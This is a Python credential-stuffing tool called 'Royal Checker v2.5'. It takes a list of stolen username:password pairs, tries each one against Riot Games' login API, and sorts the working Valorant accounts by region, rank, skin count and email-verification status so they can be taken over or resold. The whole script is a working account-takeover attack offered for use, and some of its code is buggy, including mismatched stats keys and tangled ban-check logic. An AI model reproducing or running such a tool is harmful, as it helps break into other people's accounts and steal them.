# royal_checker.py

import os
import sys
import time
import ctypes
from collections import OrderedDict
from datetime import datetime
from re import compile
from ssl import PROTOCOL_TLSv1_2
import tkinter
from tkinter import filedialog

# --- User-installable libraries ---
# Before running, please install these using pip:
# pip install colorama requests pandas keyboard urllib3
import colorama
import keyboard
import pandas
import requests
from colorama import Fore, Style, init
from requests.adapters import HTTPAdapter
from urllib3 import PoolManager

# Initialize Colorama
init(convert=True)

# --- UI Colors ---
P = Fore.MAGENTA
C = Fore.CYAN
G = Fore.GREEN
R = Fore.RED
Y = Fore.YELLOW
W = Fore.WHITE
GLD = Fore.LIGHTYELLOW_EX
RST = Style.RESET_ALL

# --- Global Stats Counters ---
# You can add or remove any stats you want to track here
stats = {
    "checked": 0, "good": 0, "failed": 0, "ratelimit": 0, "unverified": 0,
    "eu": 0, "na": 0, "br": 0, "kr": 0, "latam": 0, "ap": 0, "errors": 0,
    "no_rank": 0, "unranked": 0, "iron": 0, "bronze": 0, "silver": 0, "gold": 0,
    "platinum": 0, "diamond": 0, "ascendant": 0, "immortal": 0, "radiant": 0,
    "no_skins": 0, "_1_9": 0, "_10_19": 0, "_20_29": 0, "_30_39": 0,
    "_40_49": 0, "_50_99": 0, "_100_150": 0, "_151": 0,
    "total_combos": 0
}

is_paused = False

def toggle_pause():
    """Toggles the global pause state."""
    global is_paused
    is_paused = not is_paused

# Set up the hotkey for pausing/resuming
keyboard.add_hotkey('p', toggle_pause)

# --- Helper Classes and Functions ---

class TLSAdapter(HTTPAdapter):
    """A custom Transport Layer Security adapter for requests."""
    def init_poolmanager(self, connections, maxsize, block=False):
        self.poolmanager = PoolManager(
            num_pools=connections, maxsize=maxsize, block=block,
            ssl_version=PROTOCOL_TLSv1_2
        )

def create_dir(name):
    """Creates a directory if it doesn't already exist."""
    if not os.path.exists(name):
        os.makedirs(name)

def update_title():
    """Updates the console window title with current stats."""
    ctypes.windll.kernel32.SetConsoleTitleW(
        f"Royal Checker v2.5 | Checked: {stats['checked']}/{stats['total_combos']} | "
        f"Good: {stats['good']} | FA: {stats['unverified']} | RateLimit: {stats['ratelimit']} | "
        f"Errors: {stats['errors'] + stats['failed']}"
    )

def display_ui(current_status="Idle", current_combo="N/A"):
    """Clears the console and displays the full user interface."""
    os.system('cls' if os.name == 'nt' else 'clear')
    update_title()

    status_color = G if not is_paused else Y
    pause_text = "Running" if not is_paused else "PAUSED "
    
    # ASCII Art and Header
    print(f"""{P}
    ██████╗  ██████╗ ██╗   ██╗  █████╗  ██╗
    ██╔══██╗██╔═══██╗╚██╗ ██╔╝ ██╔══██╗ ██║
    ██████╔╝██║   ██║ ╚████╔╝  ███████║ ██║
    ██╔══██╗██║   ██║  ╚██╔╝   ██╔══██║ ██║
    ██║  ██║╚██████╔╝   ██║    ██║  ██║ ███████╗
    ╚═╝  ╚═╝ ╚═════╝    ╚═╝    ╚═╝  ╚═╝ ╚══════╝
{C}                    Version: 2.5 - by its.z1#0000
{RST}""")
    
    # Main Stats Table
    print(f"{P}╔{'═'*25}╦{'═'*29}╗")
    print(f"║ {C}OVERALL STATS {P}{' '*(10)}║ {C}ACCOUNT ACCESS      {P}{' '*(10)}║")
    print(f"╠{'═'*25}╬{'═'*29}╣")
    print(f"║ {W}Total Combos: {GLD}{stats['total_combos']:<6}{P} ║ {W}Full Access (FA):   {G}{stats['unverified']:<8}{P} ║")
    print(f"║ {W}Checked:      {C}{stats['checked']:<6}{P} ║ {W}Not Full Access:    {Y}{stats['good']-stats['unverified']:<8}{P} ║")
    print(f"║ {W}Good:         {G}{stats['good']:<6}{P} ║ {W}Rate Limited:       {R}{stats['ratelimit']:<8}{P} ║")
    print(f"║ {W}Errors:       {R}{stats['errors'] + stats['failed']:<6}{P} ║ {W}Invalid/Banned:     {R}{stats['failed']:<8}{P} ║")
    print(f"╠{'═'*12}╦{'═'*12}╩{'═'*14}╦{'═'*14}╣")
    print(f"║ {C}REGIONS {P}    ║ {C}RANKS {P}      ║ {C}SKIN COUNTS {P}      ║ {C}SKIN COUNTS {P}   ║")
    print(f"╠{'═'*12}╬{'═'*12}╦{'═'*14}╬{'═'*14}╣")
    print(f"║ {W}EU:    {GLD}{stats['eu']:<5}{P}║ {W}Radiant:   {GLD}{stats['radiant']:<3}{P} ║ {W}0 Skins:      {W}{stats['no_skins']:<4}{P} ║ {W}40-49:       {C}{stats['40_49']:<4}{P} ║")
    print(f"║ {W}NA:    {GLD}{stats['na']:<5}{P}║ {W}Immortal:  {GLD}{stats['immortal']:<3}{P} ║ {W}1-9:          {G}{stats['_1_9']:<4}{P} ║ {W}50-99:       {P}{stats['50_99']:<4}{P} ║")
    print(f"║ {W}AP:    {GLD}{stats['ap']:<5}{P}║ {W}Ascendant: {P}{stats['ascendant']:<3}{P} ║ {W}10-19:        {G}{stats['_10_19']:<4}{P} ║ {W}100-150:    {GLD}{stats['_100_150']:<4}{P} ║")
    print(f"║ {W}KR:    {GLD}{stats['kr']:<5}{P}║ {W}Diamond:   {C}{stats['diamond']:<3}{P} ║ {W}20-29:        {C}{stats['_20_29']:<4}{P} ║ {W}151+:       {GLD}{stats['_151']:<4}{P} ║")
    print(f"║ {W}BR:    {GLD}{stats['br']:<5}{P}║ {W}Platinum:  {C}{stats['platinum']:<3}{P} ║ {W}30-39:        {C}{stats['_30_39']:<4}{P} ║ {P}{' '*14}  ║")
    print(f"║ {W}LATAM: {GLD}{stats['latam']:<5}{P}║ {W}Gold:      {Y}{stats['gold']:<3}{P} ║ {P}╚{'═'*12}╩{'═'*14}╝")
    print(f"║ {P}{' '*12}║ {W}Silver:    {W}{stats['silver']:<3}{P} ║")
    print(f"║ {P}{' '*12}║ {W}Bronze:    {Y}{stats['bronze']:<3}{P} ║")
    print(f"║ {P}{' '*12}║ {W}Iron:      {W}{stats['iron']:<3}{P} ║")
    print(f"║ {P}{' '*12}║ {W}Unranked:  {W}{stats['unranked']:<3}{P} ║")
    print(f"╚{'═'*12}╩{'═'*12}╝")
    
    # Status Bar
    print(f"\n{P}╔{'═'*55}╗")
    print(f"║ {status_color}[{pause_text}]{RST} | {W}{current_status.ljust(15)}{RST} | {C}{current_combo.ljust(25)}{RST} {P}║")
    print(f"╚{'═'*55}╝{RST}")

def checker():
    # --- Setup ---
    root = tkinter.Tk()
    root.withdraw()

    # Get Combo File
    display_ui("Waiting for combo file...")
    print(f"\n{GLD}>> Please choose your combo file.{RST}")
    combo_path = filedialog.askopenfilename(
        parent=root, mode='r', title='Choose your combo file',
        filetypes=(("Text files", "*.txt"), ("All files", "*.*"))
    )

    if not combo_path:
        print(f"\n{R}>> No file selected. Exiting in 3 seconds.{RST}")
        time.sleep(3)
        sys.exit()

    with open(combo_path, 'r', encoding='utf-8', errors='ignore') as f:
        combos = f.readlines()
    
    stats['total_combos'] = len(combos)
    if stats['total_combos'] == 0:
        print(f"\n{R}>> Combo file is empty. Exiting in 3 seconds.{RST}")
        time.sleep(3)
        sys.exit()

    print(f"\n{G}>> Loaded {stats['total_combos']} combos. Starting checker...{RST}")
    time.sleep(2)

    # Create results folders
    create_dir("Results")
    create_dir("Results/Full Access")
    create_dir("Results/Email Unverified")
    create_dir("Results/Rate Limited")

    regions = ["EU", "NA", "KR", "AP", "BR", "LATAM"]
    for access_type in ["Full Access", "Email Unverified"]:
        for region in regions:
            create_dir(f"Results/{access_type}/{region}")
            create_dir(f"Results/{access_type}/{region}/UserPass")

    # --- Main Checking Loop ---
    for line in combos:
        while is_paused:
            display_ui("Checker is Paused", "Press 'P' to Resume")
            time.sleep(0.1)

        line = line.strip()
        if ":" not in line:
            continue
        
        username, password = line.split(":", 1)
        display_ui("Checking...", f"{username}:{password}")

        try:
            headers = OrderedDict({
                "Accept-Language": "en-US,en;q=0.9",
                "Accept": "application/json, text/plain, */*",
                'User-Agent': 'RiotClient/51.0.0.4429735.4381211 rso-auth (Windows;10;;Professional, x64)'
            })
            session = requests.session()
            session.headers = headers
            session.mount('https://', TLSAdapter())
            
            data = {
                "client_id": "riot-client",
                "nonce": "oYnVwCSrlS5IHKh7iI16oQ",
                "redirect_uri": "http://localhost/redirect",
                "response_type": "token id_token",
                "scope": "openid link ban lol_region",
            }
            r = session.post('https://auth.riotgames.com/api/v1/authorization', json=data)
            
            data = {'type': 'auth', 'username': username, 'password': password}
            r2 = session.put('https://auth.riotgames.com/api/v1/authorization', json=data)
            
            data = r2.json()

            if "access_token" in r2.text:
                pattern = compile('access_token=((?:[a-zA-Z]|\d|\.|-|_)*).*id_token=((?:[a-zA-Z]|\d|\.|-|_)*).*expires_in=(\d*)')
                data = pattern.findall(data['response']['parameters']['uri'])[0]
                token = data[0]
            elif "auth_failure" in r2.text:
                stats['failed'] += 1
                stats['checked'] += 1
                continue
            elif "rate_limited" in r2.text:
                stats['ratelimit'] += 1
                with open("Results/Rate Limited/ratelimited_combos.txt", "a", encoding='utf-8') as f:
                    f.write(line + "\n")
                time.sleep(30) # Wait during rate limit
                continue
            elif 'multifactor' in r2.text:
                stats['failed'] += 1 # 2FA is a failure for this checker
                stats['checked'] += 1
                continue
            else:
                stats['errors'] += 1
                stats['checked'] += 1
                continue # Unknown error

            headers = {'Authorization': f'Bearer {token}'}
            r = session.post('https://entitlements.auth.riotgames.com/api/token/v1', headers=headers, json={})
            entitlement = r.json()['entitlements_token']
            
            r = session.get('https://auth.riotgames.com/userinfo', headers=headers)
            user_info = r.json()

            # Ban Check
            if 'ban' in user_info and user_info['ban'].get('restrictions'):
                for restriction in user_info['ban']['restrictions']:
                    if restriction['type'] in ("PERMANENT_BAN", "PERMA_BAN", "TIME_BAN"):
                        stats['failed'] += 1
                        stats['checked'] += 1
                        break # Found a ban, no need to check further
                else: # This else belongs to the for loop, it runs if the loop completes without break
                    continue # No ban found, but we broke out, so continue to next combo
                continue # This continue belongs to the if statement, it runs if a ban was found

            # Account Details
            game_name = user_info.get('acct', {}).get('game_name', 'N/A')
            tag_line = user_info.get('acct', {}).get('tag_line', 'N/A')
            sub = user_info.get('sub')
            email_verified = user_info.get('email_verified', False)

            # API Call for Region, Level, Rank, etc.
            # Using HenrikDev API - may be rate-limited or unavailable
            try:
                acc_details_url = f"https://api.henrikdev.xyz/valorant/v1/account/{game_name}/{tag_line}"
                acc_res = requests.get(acc_details_url).json()
                if acc_res.get('status') != 200: raise ValueError("API error")
                
                region = acc_res['data']['region']
                account_level = acc_res['data']['account_level']
                
                mmr_url = f"https://api.henrikdev.xyz/valorant/v1/mmr/{region}/{game_name}/{tag_line}"
                mmr_res = requests.get(mmr_url).json()
                rank = mmr_res.get('data', {}).get('currenttierpatched', 'Unranked')
                rr = mmr_res.get('data', {}).get('ranking_in_tier', 0)

                match_url = f"https://api.henrikdev.xyz/valorant/v3/matches/{region}/{game_name}/{tag_line}?size=1"
                match_res = requests.get(match_url).json()
                last_match = match_res['data'][0]['metadata']['game_start_patched'] if match_res['data'] else "No recent matches"

            except Exception as e:
                stats['errors'] += 1
                stats['checked'] += 1
                with open("Results/api_errors.txt", "a", encoding='utf-8') as f:
                    f.write(line + "\n")
                continue

            # Skin Check
            skin_headers = {"X-Riot-Entitlements-JWT": entitlement, "Authorization": f"Bearer {token}"}
            skin_res = requests.get(f"https://pd.{region}.a.pvp.net/store/v1/entitlements/{sub}/e7c63390-eda7-46e0-bb7a-a6abdacd2433", headers=skin_headers)
            skin_data = skin_res.json().get("Entitlements", [])
            skin_count = len(skin_data)

            # Update Stats
            stats['good'] += 1
            if email_verified: stats['unverified'] += 1
            stats[region.lower()] += 1
            
            rank_name = ''.join(filter(str.isalpha, rank)).lower()
            if rank_name in stats: stats[rank_name] += 1 
            else: stats['unranked'] += 1

            skin_category = "No Skins"
            if skin_count == 0: stats['no_skins'] += 1
            elif 1 <= skin_count <= 9: stats['_1_9'] += 1; skin_category = "1-9 Skins"
            elif 10 <= skin_count <= 19: stats['_10_19'] += 1; skin_category = "10-19 Skins"
            elif 20 <= skin_count <= 29: stats['_20_29'] += 1; skin_category = "20-29 Skins"
            elif 30 <= skin_count <= 39: stats['_30_39'] += 1; skin_category = "30-39 Skins"
            elif 40 <= skin_count <= 49: stats['_40_49'] += 1; skin_category = "40-49 Skins"
            elif 50 <= skin_count <= 99: stats['_50_99'] += 1; skin_category = "50-99 Skins"
            elif 100 <= skin_count <= 150: stats['_100_150'] += 1; skin_category = "100-150 Skins"
            else: stats['_151'] += 1; skin_category = "151+ Skins"
            
            # --- Save Results ---
            capture_output = (
                f"═══════════════[ Royal Checker ]══════════════════\n"
                f"| User:Pass: {username}:{password}\n"
                f"| Game Name: {game_name}#{tag_line}\n"
                f"| Region: {region.upper()} | Level: {account_level}\n"
                f"| Full Access: {email_verified}\n"
                f"| Rank: {rank} ({rr} RR)\n"
                f"| Last Match: {last_match}\n"
                f"| Skins: {skin_count} ({skin_category})\n"
                f"═════════════════════════════════════════════════\n\n"
            )

            access_folder = "Full Access" if email_verified else "Email Unverified"
            region_folder = region.upper()
            
            # Main capture file
            with open(f"Results/{access_folder}/{region_folder}/{skin_category}.txt", "a", encoding='utf-8') as f:
                f.write(capture_output)
            
            # UserPass file
            with open(f"Results/{access_folder}/{region_folder}/UserPass/{skin_category}.txt", "a", encoding='utf-8') as f:
                f.write(f"{username}:{password}\n")

            # High Tier capture
            is_high_tier = rank_name in ['radiant', 'immortal', 'ascendant'] or skin_count >= 100
            if is_high_tier:
                with open("Results/High_Tier_Accounts.txt", "a", encoding='utf-8') as f:
                    f.write(capture_output)
        
        except Exception as e:
            stats['errors'] += 1
            with open("Results/unknown_errors.txt", "a", encoding='utf-8') as f:
                f.write(f"{line} | Error: {e}\n")
        finally:
            stats['checked'] += 1
            
    # --- End of Checker ---
    display_ui("Checker Finished!")
    print(f"\n{GLD}>> All combos have been checked. Check the 'Results' folder.{RST}")
    input(">> Press Enter to exit.")


if __name__ == "__main__":
    checker()